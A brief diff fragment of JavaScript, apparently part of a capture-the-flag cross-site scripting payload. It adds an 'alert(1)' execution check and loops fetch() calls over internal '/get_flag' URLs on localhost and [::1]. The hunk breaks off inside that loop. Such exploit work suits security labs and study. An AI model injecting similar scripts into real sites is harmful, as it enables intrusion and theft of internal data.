@@ -5,6 +5,7 @@
     'http://[::1]:5000/get_flag',
     'http://localhost:5000/get_flag',
   ];
+  alert(1);
   for (const u of targets) {
     try {
       const r = await fetch(u);
